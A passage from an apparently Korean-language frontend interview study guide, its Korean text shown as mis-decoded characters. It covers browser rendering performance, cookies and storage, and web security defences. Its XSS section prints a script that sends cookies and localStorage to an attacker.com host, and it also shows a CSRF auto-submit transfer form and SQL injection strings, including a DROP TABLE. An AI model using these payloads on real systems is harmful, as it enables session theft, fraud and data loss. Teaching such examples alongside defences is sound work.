<!-- 3. ë¦¬ì†ŒìŠ¤ íŒíŠ¸ -->
<link rel="preconnect" href="https://api.example.com" />
<!-- DNS lookup, TCP handshake, TLS negotiation ë¯¸ë¦¬ ìˆ˜í–‰ -->

<link rel="dns-prefetch" href="https://fonts.googleapis.com" />
<!-- DNS lookupë§Œ ë¯¸ë¦¬ ìˆ˜í–‰ -->

<link rel="prefetch" href="/next-page.js" />
<!-- ë‹¤ìŒì— í•„ìš”í•  ë¦¬ì†ŒìŠ¤ ë¯¸ë¦¬ ë‹¤ìš´ë¡œë“œ (ë‚®ì€ ìš°ì„ ìˆœìœ„) -->

<!-- 4. Critical CSS -->
<style>
  /* Above-the-fold CSSë¥¼ ì¸ë¼ì¸ìœ¼ë¡œ */
  .hero {
    ...;
  }
</style>
```

**Reflow/Repaint ìµœì†Œí™”:**

```jsx
// âŒ Layout Thrashing (ê°•ì œ ë™ê¸° ë ˆì´ì•„ì›ƒ)
const h1 = element1.offsetHeight; // Read (ë ˆì´ì•„ì›ƒ ê³„ì‚°)
element1.style.height = `${h1 * 2}px`; // Write

const h2 = element2.offsetHeight; // Read (ë‹¤ì‹œ ê³„ì‚°!)
element2.style.height = `${h2 * 2}px`; // Write

// âœ… Read â†’ Write ë¶„ë¦¬
const h1 = element1.offsetHeight; // Read
const h2 = element2.offsetHeight; // Read

element1.style.height = `${h1 * 2}px`; // Write
element2.style.height = `${h2 * 2}px`; // Write

// âœ… í•œ ë²ˆì— ë³€ê²½
element.style.cssText = `
  width: 100px;
  height: 100px;
  margin: 10px;
`; // í•œ ë²ˆë§Œ Reflow

// âœ… í´ë˜ìŠ¤ ì‚¬ìš©
element.classList.add("resized");

// âœ… DocumentFragment ì‚¬ìš©
const fragment = document.createDocumentFragment();
for (let i = 0; i < 100; i++) {
  const li = document.createElement("li");
  fragment.appendChild(li);
}
list.appendChild(fragment); // í•œ ë²ˆë§Œ Reflow
```

**GPU ê°€ì† í™œìš©:**

```css
/* GPU ê°€ì† ì†ì„± (Compositeë§Œ ë°œìƒ) */
.animated {
  transform: translateX(100px); /* âœ… */
  will-change: transform; /* ë¯¸ë¦¬ ìµœì í™” */
}

/* Reflow ìœ ë°œ ì†ì„± í”¼í•˜ê¸° */
.box {
  /* âŒ Reflow */
  left: 100px;

  /* âœ… Compositeë§Œ */
  transform: translateX(100px);
}

/* Repaint ìœ ë°œ ì†ì„± í”¼í•˜ê¸° */
.box {
  /* âŒ Repaint */
  background: red;

  /* âœ… Compositeë§Œ */
  opacity: 0.5;
}
```

**ì„±ëŠ¥ ì¸¡ì •:**

```jsx
// Performance API
performance.mark("start-render");

// ë Œë”ë§ ì‘ì—…

performance.mark("end-render");
performance.measure("render-time", "start-render", "end-render");

const measures = performance.getEntriesByType("measure");
console.log(measures[0].duration);

// DevTools Performance íƒ­
// - Scripting: JS ì‹¤í–‰
// - Rendering: Layout + Paint
// - Painting: Paintë§Œ
// - Composite Layers: Composite
```

---

### Q6. ì¿ í‚¤, ì„¸ì…˜, ë¡œì»¬ìŠ¤í† ë¦¬ì§€, ì„¸ì…˜ìŠ¤í† ë¦¬ì§€ì˜ ì°¨ì´ì ì„ ì„¤ëª…í•´ì£¼ì„¸ìš”.

**í‚¤ì›Œë“œ:** `í´ë¼ì´ì–¸íŠ¸ ì €ì¥ì†Œ`, `ìš©ëŸ‰`, `ë§Œë£Œ`, `HTTP ì „ì†¡`, `ë³´ì•ˆ`, `ë„ë©”ì¸`

**ë‹µë³€:**

**ë¹„êµí‘œ:**

| íŠ¹ì§•      | Cookie          | LocalStorage | SessionStorage | Session (ì„œë²„) |
| --------- | --------------- | ------------ | -------------- | -------------- |
| ì €ì¥ ìœ„ì¹˜ | í´ë¼ì´ì–¸íŠ¸      | í´ë¼ì´ì–¸íŠ¸   | í´ë¼ì´ì–¸íŠ¸     | ì„œë²„           |
| ìš©ëŸ‰      | 4KB             | 5-10MB       | 5-10MB         | ë¬´ì œí•œ         |
| ë§Œë£Œ      | ì„¤ì • ê°€ëŠ¥       | ì˜êµ¬         | íƒ­ ë‹«ìœ¼ë©´ ì‚­ì œ | ì„œë²„ ì„¤ì •      |
| HTTP ì „ì†¡ | ë§¤ ìš”ì²­ë§ˆë‹¤     | ì•ˆí•¨         | ì•ˆí•¨           | Session IDë§Œ   |
| ì ‘ê·¼      | ì„œë²„/í´ë¼ì´ì–¸íŠ¸ | í´ë¼ì´ì–¸íŠ¸ë§Œ | í´ë¼ì´ì–¸íŠ¸ë§Œ   | ì„œë²„ë§Œ         |
| ë²”ìœ„      | ë„ë©”ì¸/ê²½ë¡œ     | ë„ë©”ì¸       | íƒ­             | ì„œë²„           |

**Cookie:**

```jsx
// ì„¤ì •
document.cookie = "user=John; max-age=3600; path=/; secure; samesite=strict";

// ì†ì„±:
// - max-age: ë§Œë£Œ ì‹œê°„ (ì´ˆ)
// - expires: ë§Œë£Œ ë‚ ì§œ
// - path: ê²½ë¡œ
// - domain: ë„ë©”ì¸
// - secure: HTTPSë§Œ
// - httpOnly: JS ì ‘ê·¼ ë¶ˆê°€ (ì„œë²„ì—ì„œë§Œ ì„¤ì •)
// - samesite: CSRF ë°©ì–´ (strict/lax/none)

// ì½ê¸°
const cookies = document.cookie.split("; ").reduce((acc, cookie) => {
  const [key, value] = cookie.split("=");
  acc[key] = decodeURIComponent(value);
  return acc;
}, {});

console.log(cookies.user); // 'John'

// ì‚­ì œ (ê³¼ê±° ë‚ ì§œë¡œ ì„¤ì •)
document.cookie = "user=; max-age=0";

// Next.js (ì„œë²„ ì»´í¬ë„ŒíŠ¸)
import { cookies } from "next/headers";

const cookieStore = cookies();
const token = cookieStore.get("token");
cookieStore.set("user", "John", {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 3600,
});
```

**localStorage:**

```jsx
// ì„¤ì •
localStorage.setItem("theme", "dark");
localStorage.setItem("user", JSON.stringify({ name: "John", age: 30 }));

// ì½ê¸°
const theme = localStorage.getItem("theme"); // 'dark'
const user = JSON.parse(localStorage.getItem("user"));

// ì‚­ì œ
localStorage.removeItem("theme");
localStorage.clear(); // ì „ì²´ ì‚­ì œ

// ìš©ëŸ‰ ì²´í¬
try {
  localStorage.setItem("test", "data");
} catch (e) {
  if (e.name === "QuotaExceededError") {
    console.log("Storage full");
  }
}

// ì´ë²¤íŠ¸ ë¦¬ìŠ¤ë‹ (ë‹¤ë¥¸ íƒ­ì—ì„œ ë³€ê²½ ê°ì§€)
window.addEventListener("storage", (e) => {
  if (e.key === "theme") {
    console.log("Theme changed:", e.newValue);
    updateTheme(e.newValue);
  }
});

// ì‚¬ìš© ì‚¬ë¡€:
// - ì‚¬ìš©ì ì„¤ì • (í…Œë§ˆ, ì–¸ì–´)
// - ìºì‹œ ë°ì´í„°
// - í¼ ì„ì‹œ ì €ì¥
```

**sessionStorage:**

```jsx
// APIëŠ” localStorageì™€ ë™ì¼
sessionStorage.setItem("tempData", "value");
const data = sessionStorage.getItem("tempData");
sessionStorage.removeItem("tempData");
sessionStorage.clear();

// ì°¨ì´ì :
// 1. íƒ­ì„ ë‹«ìœ¼ë©´ ì‚­ì œë¨
// 2. ê°™ì€ ë„ë©”ì¸ì´ì–´ë„ ë‹¤ë¥¸ íƒ­ì€ ë³„ë„ ì €ì¥ì†Œ
// 3. storage ì´ë²¤íŠ¸ ë°œìƒ ì•ˆí•¨

// ì‚¬ìš© ì‚¬ë¡€:
// - ì„ì‹œ í¼ ë°ì´í„°
// - ìœ„ìë“œ/ìŠ¤í… ì§„í–‰ ìƒíƒœ
// - ì¼íšŒì„± ë°ì´í„°
```

**Server Session:**

```jsx
// app/api/login/route.js (Next.js)
import { cookies } from "next/headers";

export async function POST(request) {
  const { username, password } = await request.json();

  // ì¸ì¦
  const user = await authenticate(username, password);

  if (!user) {
    return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
  }

  // ì„¸ì…˜ ìƒì„± (ì„œë²„ ë©”ëª¨ë¦¬/DB/Redis)
  const sessionId = createSession(user);

  // ì„¸ì…˜ IDë¥¼ ì¿ í‚¤ì— ì €ì¥
  cookies().set("session", sessionId, {
    httpOnly: true, // JS ì ‘ê·¼ ë¶ˆê°€ (XSS ë°©ì–´)
    secure: true, // HTTPSë§Œ
    sameSite: "strict", // CSRF ë°©ì–´
    maxAge: 60 * 60 * 24 * 7, // 7ì¼
  });

  return NextResponse.json({ user });
}

// ì„¸ì…˜ í™•ì¸
export async function GET(request) {
  const sessionId = cookies().get("session")?.value;

  if (!sessionId) {
    return NextResponse.json({ error: "Not logged in" }, { status: 401 });
  }

  const session = await getSession(sessionId);

  if (!session) {
    return NextResponse.json({ error: "Invalid session" }, { status: 401 });
  }

  return NextResponse.json({ user: session.user });
}
```

**ë³´ì•ˆ ê³ ë ¤ì‚¬í•­:**

| ê³µê²©        | Cookie          | LocalStorage   | SessionStorage | Server Session      |
| ----------- | --------------- | -------------- | -------------- | ------------------- |
| XSS         | httpOnlyë¡œ ë°©ì–´ | ì·¨ì•½ (JS ì ‘ê·¼) | ì·¨ì•½ (JS ì ‘ê·¼) | ì•ˆì „                |
| CSRF        | SameSiteë¡œ ë°©ì–´ | ìë™ ì „ì†¡ ì•ˆë¨ | ìë™ ì „ì†¡ ì•ˆë¨ | Cookie ì‚¬ìš© ì‹œ ì·¨ì•½ |
| ì¤‘ê°„ì ê³µê²© | Secure í”Œë˜ê·¸   | HTTPS í•„ìš”     | HTTPS í•„ìš”     | HTTPS í•„ìš”          |

**ì‚¬ìš© ê¶Œì¥ì‚¬í•­:**

```jsx
// 1. ì¸ì¦ í† í° â†’ httpOnly Cookie
cookies().set("token", jwt, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
});

// 2. í…Œë§ˆ, ì–¸ì–´ â†’ localStorage
localStorage.setItem("theme", "dark");
localStorage.setItem("language", "ko");

// 3. ì„ì‹œ í¼ ë°ì´í„° â†’ sessionStorage
sessionStorage.setItem("draftPost", JSON.stringify(formData));

// 4. ë¯¼ê°í•œ ì •ë³´ â†’ Server Session
// - ì‚¬ìš©ì ê¶Œí•œ
// - ê°œì¸ ì •ë³´
// - ê²°ì œ ì •ë³´

// âŒ ì ˆëŒ€ í•˜ì§€ ë§ ê²ƒ
localStorage.setItem("password", "secret"); // ë¹„ë°€ë²ˆí˜¸
localStorage.setItem("creditCard", "1234-5678"); // ì¹´ë“œ ë²ˆí˜¸
```

**ìš©ëŸ‰ ì´ˆê³¼ ì²˜ë¦¬:**

```jsx
function setItem(key, value) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (e) {
    if (e.name === "QuotaExceededError") {
      // ì˜¤ë˜ëœ í•­ëª© ì‚­ì œ
      const items = Object.keys(localStorage)
        .map((key) => ({
          key,
          timestamp: JSON.parse(localStorage.getItem(key)).timestamp,
        }))
        .sort((a, b) => a.timestamp - b.timestamp);

      // ê°€ì¥ ì˜¤ë˜ëœ í•­ëª© ì‚­ì œ
      localStorage.removeItem(items[0].key);

      // ì¬ì‹œë„
      localStorage.setItem(key, JSON.stringify(value));
    }
  }
}
```

---

### Q7. ì›¹ ë³´ì•ˆ(XSS, CSRF, SQL Injection)ê³¼ ë°©ì–´ ë°©ë²•ì„ ì„¤ëª…í•´ì£¼ì„¸ìš”.

**í‚¤ì›Œë“œ:** `ìŠ¤í¬ë¦½íŠ¸ ì£¼ì…`, `í† í° ê²€ì¦`, `íŒŒë¼ë¯¸í„°í™”`, `CSP`, `sanitize`, `httpOnly`

**ë‹µë³€:**

**1. XSS (Cross-Site Scripting)**

**ê°œë…:** ì•…ì˜ì ì¸ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì›¹ í˜ì´ì§€ì— ì£¼ì…í•˜ëŠ” ê³µê²©

**ê³µê²© ì˜ˆì‹œ:**

```jsx
// ì‚¬ìš©ì ì…ë ¥ì„ ê·¸ëŒ€ë¡œ ë Œë”ë§
const userInput = '<script>alert("XSS")</script>';
element.innerHTML = userInput; // âŒ ìœ„í—˜

// ì‹¤ì œ ê³µê²©
const userInput = `
  <script>
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookie: document.cookie,
        localStorage: localStorage
      })
    });
  </script>
`;

// Stored XSS: DBì— ì €ì¥ë˜ì–´ ëª¨ë“  ì‚¬ìš©ìì—ê²Œ ì˜í–¥
// ëŒ“ê¸€, ê²Œì‹œê¸€ ë“±ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì‚½ì…

// Reflected XSS: URL íŒŒë¼ë¯¸í„°ë¡œ ì „ë‹¬
// https://example.com/search?q=<script>alert('XSS')</script>
```

**ë°©ì–´ ë°©ë²•:**

```jsx
// 1. ReactëŠ” ê¸°ë³¸ì ìœ¼ë¡œ XSS ë°©ì–´ (ìë™ ì´ìŠ¤ì¼€ì´í”„)
const userInput = '<script>alert("XSS")</script>';
return <div>{userInput}</div>; // í…ìŠ¤íŠ¸ë¡œ ë Œë”ë§: &lt;script&gt;...

// 2. HTML ë Œë”ë§ì´ í•„ìš”í•œ ê²½ìš° Sanitize
import DOMPurify from "dompurify";

const dirtyHTML = '<p>ì•ˆì „í•œ ë‚´ìš©</p><script>alert("XSS")</script>';
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
// ê²°ê³¼: '<p>ì•ˆì „í•œ ë‚´ìš©</p>'

return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;

// 3. CSP (Content Security Policy)
// next.config.js
const cspHeader = `
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
`;

module.exports = {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          {
            key: "Content-Security-Policy",
            value: cspHeader.replace(/\s{2,}/g, " ").trim(),
          },
        ],
      },
    ];
  },
};

// 4. ì…ë ¥ ê²€ì¦
function validateInput(input) {
  // íŠ¹ìˆ˜ ë¬¸ì ì œí•œ
  if (/<script|javascript:|on\w+=/i.test(input)) {
    throw new Error("Invalid input");
  }
  return input;
}

// 5. HttpOnly Cookie
cookies().set("session", token, {
  httpOnly: true, // JSë¡œ ì ‘ê·¼ ë¶ˆê°€
  secure: true,
  sameSite: "strict",
});
```

**2. CSRF (Cross-Site Request Forgery)**

**ê°œë…:** ì‚¬ìš©ìê°€ ì˜ë„í•˜ì§€ ì•Šì€ ìš”ì²­ì„ ë³´ë‚´ë„ë¡ ë§Œë“œëŠ” ê³µê²©

**ê³µê²© ì˜ˆì‹œ:**

```html
<!-- ê³µê²©ì ì‚¬ì´íŠ¸ (attacker.com) -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
<!-- ì‚¬ìš©ìê°€ bank.comì— ë¡œê·¸ì¸ ìƒíƒœë©´ ìë™ ì‹¤í–‰ -->

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

**ë°©ì–´ ë°©ë²•:**

```jsx
// 1. CSRF í† í°
// ì„œë²„: í† í° ìƒì„± ë° ì„¸ì…˜ì— ì €ì¥
import { randomBytes } from "crypto";

function generateCsrfToken() {
  return randomBytes(32).toString("hex");
}

// í˜ì´ì§€ ë Œë”ë§ ì‹œ í† í° í¬í•¨
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value={csrfToken} />
  <input type="text" name="to" />
  <input type="number" name="amount" />
  <button type="submit">Transfer</button>
</form>;

// ì„œë²„: í† í° ê²€ì¦
export async function POST(request) {
  const formData = await request.formData();
  const csrfToken = formData.get("csrf_token");
  const sessionToken = getSessionToken(request);

  if (csrfToken !== sessionToken) {
    return NextResponse.json({ error: "Invalid CSRF token" }, { status: 403 });
  }

  // ìš”ì²­ ì²˜ë¦¬
}

// 2. SameSite Cookie
cookies().set("session", sessionId, {
  sameSite: "strict", // ë‹¤ë¥¸ ì‚¬ì´íŠ¸ì—ì„œ ìë™ ì „ì†¡ ì•ˆë¨
  // 'lax': GET ìš”ì²­ë§Œ í—ˆìš©
  // 'none': ëª¨ë“  ìš”ì²­ í—ˆìš© (Secure í•„ìˆ˜)
});

// 3. Origin/Referer í™•ì¸
export async function POST(request) {
  const origin = request.headers.get("origin");
  const referer = request.headers.get("referer");

  const allowedOrigins = ["https://myapp.com", "https://www.myapp.com"];

  if (!origin || !allowedOrigins.includes(origin)) {
    return NextResponse.json({ error: "Forbidden" }, { status: 403 });
  }

  // ìš”ì²­ ì²˜ë¦¬
}

// 4. Double Submit Cookie
// ì¿ í‚¤ì™€ ìš”ì²­ ë³¸ë¬¸ì— ê°™ì€ í† í° ì „ì†¡
cookies().set("csrf-token", token);

fetch("/api/transfer", {
  method: "POST",
  headers: {
    "X-CSRF-Token": token, // ì¿ í‚¤ì™€ ë™ì¼í•œ ê°’
  },
  body: JSON.stringify(data),
});

// ì„œë²„: ë‘ ê°’ì´ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸
const cookieToken = cookies().get("csrf-token");
const headerToken = request.headers.get("x-csrf-token");

if (cookieToken !== headerToken) {
  return NextResponse.json({ error: "Invalid token" }, { status: 403 });
}
```

**3. SQL Injection**

**ê°œë…:** SQL ì¿¼ë¦¬ì— ì•…ì˜ì ì¸ ì½”ë“œë¥¼ ì£¼ì…í•˜ëŠ” ê³µê²©

**ê³µê²© ì˜ˆì‹œ:**

```jsx
// âŒ ìœ„í—˜í•œ ì¿¼ë¦¬
const userId = req.query.id; // "1 OR 1=1"
const query = `SELECT * FROM users WHERE id = ${userId}`;
// ê²°ê³¼: SELECT * FROM users WHERE id = 1 OR 1=1
// ëª¨ë“  ì‚¬ìš©ì ì •ë³´ ì¡°íšŒë¨

// âŒ ë” ìœ„í—˜í•œ ê³µê²©
const userId = "1; DROP TABLE users; --";
const query = `SELECT * FROM users WHERE id = ${userId}`;
// ê²°ê³¼: users í…Œì´ë¸” ì‚­ì œ

// âŒ ë¡œê·¸ì¸ ìš°íšŒ
const username = "admin' --";
const password = "anything";
const query = `
  SELECT * FROM users 
  WHERE username = '${username}' AND password = '${password}'
`;
// ê²°ê³¼: SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
// ë¹„ë°€ë²ˆí˜¸ ì²´í¬ ë¬´ì‹œë¨
```

**ë°©ì–´ ë°©ë²•:**

```jsx
// 1. âœ… Prepared Statement (Parameterized Query)
// PostgreSQL
const userId = req.query.id;
const query = "SELECT * FROM users WHERE id = $1";
const result = await db.query(query, [userId]);

// MySQL
const query = "SELECT * FROM users WHERE id = ?";
const [rows] = await db.execute(query, [userId]);

// 2. âœ… ORM ì‚¬ìš© (Prisma)
import { PrismaClient } from "@prisma/client";
const prisma = new PrismaClient();

const userId = req.query.id;
const user = await prisma.user.findUnique({
  where: { id: userId }, // ìë™ìœ¼ë¡œ ì•ˆì „í•˜ê²Œ ì´ìŠ¤ì¼€ì´í”„
});

// 3. âœ… ì…ë ¥ ê²€ì¦
import { z } from "zod";

const userIdSchema = z.number().int().positive();

try {
  const userId = userIdSchema.parse(Number(req.query.id));
  // íƒ€ì…ì´ ì•ˆì „í•¨
} catch (error) {
  return NextResponse.json({ error: "Invalid ID" }, { status: 400 });
}

// 4. âœ… Whitelist ë°©ì‹
const allowedFields = ["name", "email", "created_at"];
const sortField = req.query.sort;

if (!allowedFields.includes(sortField)) {
  throw new Error("Invalid sort field");
}

const query = `SELECT * FROM users ORDER BY ${sortField}`;

// 5. âœ… ìµœì†Œ ê¶Œí•œ ì›ì¹™
// DB ì‚¬ìš©ìì—ê²Œ í•„ìš”í•œ ê¶Œí•œë§Œ ë¶€ì—¬
// - SELECT, INSERT, UPDATEë§Œ
// - DROP, CREATE TABLE ê¶Œí•œ ì œê±°
```

**ì¢…í•© ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸:**

```jsx
// âœ… 1. ì‚¬ìš©ì ì…ë ¥ ê²€ì¦ ë° Sanitize
function validateAndSanitize(input) {
  // íƒ€ì… ê²€ì¦
  const schema = z.string().max(100);
  const validated = schema.parse(input);

  // HTML Sanitize
  return DOMPurify.sanitize(validated);
}

// âœ… 2. HTTPS ì‚¬ìš©
// next.config.js
module.exports = {
  async redirects() {
    return [{
      source: '/:path*',
      has: [{ type: 'header', key: 'x-forwarded-proto', value: 'http' }],
      destination: 'https://example.com/:path*',
      permanent: true
    }];
  }
};

// âœ… 3. ë³´ì•ˆ í—¤ë” ì„¤ì •
module.exports = {
  async headers() {
    return [{
      source: '/:path*',
      headers: [
        { key: 'X-Frame-Options', value: 'DENY' }, // Clickjacking ë°©ì–´
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
        { key: 'Content-Security-Policy', value: cspHeader },
      ]
    }];
  }
};

// âœ… 4. Rate Limiting
import { Ratelimit } from '@upstash/ratelimit';

const ratelimit = new Ratelimit({
  redis: redis,
  limiter: Ratelimit.slidingWindow(10, '10 s')
});

export async function POST(request) {
  const ip = request.ip ?? '127.0.0.1';
  const { success } = await ratelimit.limit(ip);

  if (!success) {
    return NextResponse.json(
      { error: 'Too many requests' },
      { status: 429 }
    );
  }

  // ìš”ì²­ ì²˜ë¦¬
}

// âœ… 5. ë¯¼ê°í•œ ë°ì´í„° ì•”í˜¸í™”
import bcrypt from 'bcrypt';

// ë¹„ë°€ë²ˆí˜¸ í•´ì‹±
const hashedPassword = await bcrypt.hash(password, 10);

// ë¹„ë°€ë²ˆí˜¸ ê²€ì¦
const isValid = await bcrypt.compare(password, hashedPassword);

// âœ… 6. í™˜ê²½ ë³€ìˆ˜ ë³´í˜¸
// .env.local
DATABASE_URL=...
SECRET_KEY=...

// ì ˆëŒ€ í´ë¼ì´ì–¸íŠ¸ë¡œ ë…¸ì¶œí•˜ì§€ ì•Šê¸°
// NEXT_PUBLIC_ ì ‘ë‘ì‚¬ ì£¼ì˜

// âœ… 7. ì •ê¸°ì ì¸ ë³´ì•ˆ ê°ì‚¬
// npm audit
// npm audit fix

// ì˜ì¡´ì„± ì—…ë°ì´íŠ¸
// npm outdated
// npm update
```
